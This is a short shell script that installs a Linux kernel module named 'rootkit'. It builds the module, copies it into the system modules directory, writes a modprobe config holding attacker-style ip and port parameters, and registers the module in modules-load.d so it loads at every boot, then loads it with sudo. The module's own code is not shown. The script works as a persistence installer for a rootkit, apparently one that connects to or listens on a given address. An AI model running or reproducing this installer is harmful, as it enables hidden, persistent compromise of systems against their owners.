#!/bin/sh

set -e

IP=${1:-127.0.0.1}
PORT=${2:-4242}
MODULE_NAME="rootkit"
MODULE_PATH="/lib/modules/$(uname -r)/extra"

echo "[+] Building module..."
make

echo "[+] Copying module to ${MODULE_PATH}..."
sudo mkdir -p "$MODULE_PATH"
sudo cp ${MODULE_NAME}.ko "$MODULE_PATH/"

echo "[+] Running depmod..."
sudo depmod

echo "[+] Creating modprobe config for parameters..."
echo "options ${MODULE_NAME} ip=${IP} port=${PORT}" | sudo tee /etc/modprobe.d/${MODULE_NAME}.conf

echo "[+] Adding module to modules-load.d to load at boot..."
echo "${MODULE_NAME}" | sudo tee /etc/modules-load.d/${MODULE_NAME}.conf

echo "[+] Loading module with modprobe and parameters..."
sudo modprobe ${MODULE_NAME} ip="${IP}" port="${PORT}"

echo "[+] Done. Module loaded with ip=$IP and port=$PORT"
